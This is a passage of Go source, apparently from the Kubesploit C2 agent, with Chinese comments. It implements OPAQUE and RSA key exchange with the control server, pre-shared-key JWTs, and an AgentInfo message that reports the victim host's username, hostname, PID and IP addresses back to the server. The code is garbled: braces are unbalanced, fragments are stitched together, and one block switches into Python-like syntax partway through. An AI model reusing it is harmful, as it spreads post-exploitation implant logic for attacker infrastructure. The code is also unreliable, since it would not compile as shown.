userAuth := gopaque.NewUserAuth(gopaque.CryptoDefault, a.ID.Bytes(), userKex)

// 2 - 使用密码调用 Init 方法，并将生成的 UserAuthInit 发送给服务器
userAuthInit, err := userAuth.Init(a.pwdU)
if err != nil {
    return fmt.Errorf("there was an error creating the OPAQUE user authentication initialization message:\r\n%s", err.Error())
}

userAuthInitBytes, errUserAuthInitBytes := userAuthInit.ToBytes()
if errUserAuthInitBytes != nil {
    return fmt.Errorf("there was an error marshalling the OPAQUE user authentication initialization message to bytes:\r\n%s", errUserAuthInitBytes.Error())
}

// 要发送到服务器的消息
authInitBase := messages.Base{
    Version: 1.0,
    ID:      a.ID,
	// 创建一个类型为"AuthInit"的结构体，并设置其Payload和Padding字段
	Type:    "AuthInit",
	Payload: userAuthInitBytes,
	Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
}

// 使用预共享密钥（PSK）计算SHA256哈希值，作为JWT和JWE加密密钥的密钥
k := sha256.Sum256([]byte(a.psk))
a.secret = k[:]

// 使用预身份验证的预共享密钥创建JWT；在身份验证后由服务器更新
agentJWT, errJWT := a.getJWT()
if errJWT != nil {
	return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE authentication:\r\n%s", errJWT)
}
a.JWT = agentJWT

// 发送"POST"请求，进行身份验证初始化
authInitResp, errAuthInitResp := a.sendMessage("POST", authInitBase)

if errAuthInitResp != nil {
	return fmt.Errorf("there was an error sending the agent OPAQUE authentication initialization message:\r\n%s", errAuthInitResp.Error())
}
	}

	// 当梅林服务器重新启动但不知道代理时
	if authInitResp.Type == "ReRegister" {
		// 如果设置了详细模式，打印接收到的 OPAQUE ReRegister 响应，将 initial 设置为 false
		if a.Verbose {
			message("note", "Received OPAQUE ReRegister response, setting initial to false")
		}
		a.initial = false
		return nil
	}

	// 如果接收到的消息类型不是 AuthInit，则返回错误
	if authInitResp.Type != "AuthInit" {
		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user authentication initialization", authInitResp.Type)
	}

	// 3 - 接收服务器的 ServerAuthComplete
	var serverComplete gopaque.ServerAuthComplete

	// 将服务器的 ServerAuthComplete 从字节转换为结构体
	errServerComplete := serverComplete.FromBytes(gopaque.CryptoDefault, authInitResp.Payload.([]byte))
	if errServerComplete != nil {
// 返回一个格式化的错误信息，指示从字节中解组 OPAQUE 服务器完成消息时出错
return fmt.Errorf("there was an error unmarshalling the OPAQUE server complete message from bytes:\r\n%s", errServerComplete.Error())

// 如果设置了详细模式，打印接收到 OPAQUE 服务器完成消息的提示
if a.Verbose {
    message("note", "Received OPAQUE server complete message")
}

// 如果设置了调试模式，打印 OPAQUE Beta、V、PubS 和 EnvU 的值
if a.Debug {
    message("debug", fmt.Sprintf("OPAQUE Beta: %x", serverComplete.Beta))
    message("debug", fmt.Sprintf("OPAQUE V: %x", serverComplete.V))
    message("debug", fmt.Sprintf("OPAQUE PubS: %x", serverComplete.ServerPublicKey))
    message("debug", fmt.Sprintf("OPAQUE EnvU: %x", serverComplete.EnvU))
}

// 调用 Complete 方法，使用服务器的 ServerAuthComplete 完成 OPAQUE 认证，得到 UserAuthFinish 结构
_, userAuthComplete, errUserAuth := userAuth.Complete(&serverComplete)
// 如果完成 OPAQUE 认证时出错，返回格式化的错误信息
if errUserAuth != nil {
    return fmt.Errorf("there was an error completing OPAQUE authentication:\r\n%s", errUserAuth)
}
	}

	// 将用户认证完成消息转换为字节流
	userAuthCompleteBytes, errUserAuthCompleteBytes := userAuthComplete.ToBytes()
	// 如果转换过程中出现错误，返回错误信息
	if errUserAuthCompleteBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user authentication complete message to bytes:\r\n%s", errUserAuthCompleteBytes.Error())
	}

	// 创建包含认证完成消息的基本消息
	authCompleteBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "AuthComplete",
		Payload: &userAuthCompleteBytes,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// 保存 OPAQUE 导出的 Diffie-Hellman 密钥
	a.secret = []byte(userKex.SharedSecret.String())

	// 发送用户认证完成消息
	authCompleteResp, errAuthCompleteResp := a.sendMessage("POST", authCompleteBase)
# 如果发送代理OPAQUE认证完成消息时出现错误，则返回相应的错误信息
if errAuthCompleteResp != nil:
    return fmt.Errorf("there was an error sending the agent OPAQUE authentication completion message:\r\n%s", errAuthCompleteResp.Error())

# 如果认证完成响应中包含令牌，则将其赋值给a.JWT
if authCompleteResp.Token != "":
    a.JWT = authCompleteResp.Token

# 根据认证完成响应的类型进行不同的处理
switch authCompleteResp.Type:
    # 如果类型为"ServerOk"，并且a.Verbose为真，则输出代理认证成功的消息
    case "ServerOk":
        if a.Verbose:
            message("success", "Agent authentication successful")
        # 如果a.Debug为真，则输出"Leaving agent.opaqueAuthenticate without error"的调试信息
        if a.Debug:
            message("debug", "Leaving agent.opaqueAuthenticate without error")
        # 返回空错误，表示认证成功
        return nil
    # 如果类型不是"ServerOk"，则返回相应的错误信息
    default:
        return fmt.Errorf("received unexpected or unrecognized message type during OPAQUE authentication completion:\r\n%s", authCompleteResp.Type)
// rsaKeyExchange函数用于与服务器创建和交换RSA密钥
func (a *Agent) rsaKeyExchange() error {
    // 如果调试模式开启，打印进入rsaKeyExchange函数的调试信息
    if a.Debug {
        message("debug", "Entering into rsaKeyExchange function")
    }

    // 创建KeyExchange消息结构体，包含公钥信息
    pk := messages.KeyExchange{
        PublicKey: a.RSAKeys.PublicKey,
    }

    // 创建Base消息结构体，包含版本号、ID、类型、负载和填充信息
    m := messages.Base{
        Version: 1.0,
        ID:      a.ID,
        Type:    "KeyExchange",
        Payload: pk,
        Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	// 发送密钥交换消息给服务器
	resp, reqErr := a.sendMessage("POST", m)

	// 如果发送消息时出现错误，返回错误信息
	if reqErr != nil {
		return fmt.Errorf("there was an error sending the key exchange message:\r\n%s", reqErr.Error())
	}

	// 处理服务器返回的密钥交换响应
	_, errKeyExchange := a.messageHandler(resp)

	// 如果处理密钥交换响应时出现错误，返回错误信息
	if errKeyExchange != nil {
		return fmt.Errorf("there was an error handling the RSA key exchange response message:\r\n%s", errKeyExchange)
	}

	// 如果调试模式开启，输出调试信息
	if a.Debug {
		message("debug", "Leaving rsaKeyExchange function without error")
	}
	// 返回空值表示没有错误发生
	return nil
// getJWT函数用于在向服务器发送第一条消息时发送未经身份验证的JWT
func (a *Agent) getJWT() (string, error) {
	// 创建加密器
	encrypter, encErr := jose.NewEncrypter(jose.A256GCM,
		jose.Recipient{
			Algorithm: jose.DIRECT, // 不创建每条消息的密钥
			Key:       a.secret},
		(&jose.EncrypterOptions{}).WithType("JWT").WithContentType("JWT"))
	if encErr != nil {
		return "", fmt.Errorf("创建JWT加密器时出错:\r\n%s", encErr.Error())
	}

	// 创建签名者
	signer, errSigner := jose.NewSigner(jose.SigningKey{
		Algorithm: jose.HS256,
		Key:       a.secret},
		(&jose.SignerOptions{}).WithType("JWT"))
	if errSigner != nil {
		// 如果创建 JWT 签名者时出现错误，返回错误信息
		return "", fmt.Errorf("there was an error creating the JWT signer:\r\n%s", errSigner.Error())
	}

	// 构建 JWT 声明
	cl := jwt.Claims{
		Expiry:   jwt.NewNumericDate(time.Now().UTC().Add(time.Second * 10)), // 设置过期时间为当前时间加上10秒
		IssuedAt: jwt.NewNumericDate(time.Now().UTC()), // 设置签发时间为当前时间
		ID:       a.ID.String(), // 设置 ID 为给定的字符串
	}

	// 通过签名者和加密者对声明进行签名和加密，得到 JWT 字符串
	agentJWT, err := jwt.SignedAndEncrypted(signer, encrypter).Claims(cl).CompactSerialize()
	if err != nil {
		// 如果序列化 JWT 字符串时出现错误，返回错误信息
		return "", fmt.Errorf("there was an error serializing the JWT:\r\n%s", err)
	}

	// 解析 JWT 字符串以检查是否有错误
	_, errParse := jwt.ParseSignedAndEncrypted(agentJWT)
	if errParse != nil {
		// 如果解析加密的 JWT 字符串时出现错误，返回错误信息
		return "", fmt.Errorf("there was an error parsing the encrypted JWT:\r\n%s", errParse.Error())
	}
// 返回代理JWT和空错误
return agentJWT, nil
}

// getAgentInfoMessage用于将有关代理和其配置的信息放入消息中并返回
func (a *Agent) getAgentInfoMessage() messages.Base {
    // 创建系统信息消息
    sysInfoMessage := messages.SysInfo{
        Platform:     a.Platform, // 设置平台信息
        Architecture: a.Architecture, // 设置架构信息
        UserName:     a.UserName, // 设置用户名
        UserGUID:     a.UserGUID, // 设置用户GUID
        HostName:     a.HostName, // 设置主机名
        Pid:          a.Pid, // 设置进程ID
        Ips:          a.Ips, // 设置IP地址
    }

    // 创建代理信息消息
    agentInfoMessage := messages.AgentInfo{
        Version:       kubesploitVersion.Version, // 设置版本信息
        Build:         build, // 设置构建信息
        WaitTime:      a.WaitTime.String(), // 设置等待时间
		// 设置PaddingMax字段为a.PaddingMax的值
		PaddingMax:    a.PaddingMax,
		// 设置MaxRetry字段为a.MaxRetry的值
		MaxRetry:      a.MaxRetry,
		// 设置FailedCheckin字段为a.FailedCheckin的值
		FailedCheckin: a.FailedCheckin,
		// 设置Skew字段为a.Skew的值
		Skew:          a.Skew,
		// 设置Proto字段为a.Proto的值
		Proto:         a.Proto,
		// 设置SysInfo字段为sysInfoMessage的值
		SysInfo:       sysInfoMessage,
		// 设置KillDate字段为a.KillDate的值
		KillDate:      a.KillDate,
		// 设置JA3字段为a.JA3的值
		JA3:           a.JA3,
	}

	// 创建一个Base消息对象
	baseMessage := messages.Base{
		// 设置Version字段为1.0
		Version: 1.0,
		// 设置ID字段为a.ID的值
		ID:      a.ID,
		// 设置Type字段为"AgentInfo"
		Type:    "AgentInfo",
		// 设置Payload字段为agentInfoMessage的值
		Payload: agentInfoMessage,
		// 设置Padding字段为core.RandStringBytesMaskImprSrc(a.PaddingMax)的值
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// 返回Base消息对象
	return baseMessage
}
// TODO 将此功能集中到一个包中，因为它在这里和服务器中都被使用
// message 用于在命令行打印消息
func message(level string, message string) {
    // 根据不同的消息级别使用不同的颜色打印消息
    switch level {
    case "info":
        color.Cyan("[i]" + message)
    case "note":
        color.Yellow("[-]" + message)
    case "warn":
        color.Red("[!]" + message)
    case "debug":
        color.Red("[DEBUG]" + message)
    case "success":
        color.Green("[+]" + message)
    default:
        color.Red("[_-_]Invalid message level: " + message)
    }
}
// 添加证书装订
// 更新 Makefile 以仅针对代理移除调试堆栈跟踪。GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
// 添加类似 JavaScript 代理中的打印消息的标准函数。将其作为代理和服务器的库？
// 配置设置 UserAgent 代理控制消息
```